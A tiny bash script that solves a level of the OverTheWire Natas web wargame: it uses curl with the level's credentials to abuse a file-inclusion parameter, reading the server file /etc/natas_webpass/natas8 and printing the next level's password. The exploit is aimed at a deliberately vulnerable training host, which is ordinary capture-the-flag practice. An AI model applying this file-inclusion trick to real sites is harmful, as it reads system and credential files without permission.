#!/bin/bash

export natas8pass=$(curl -s -u natas7:$natas7pass natas7.natas.labs.overthewire.org/index.php\?page=/etc/natas_webpass/natas8 | grep -v '^<' | grep -v '^$')
echo $natas8pass
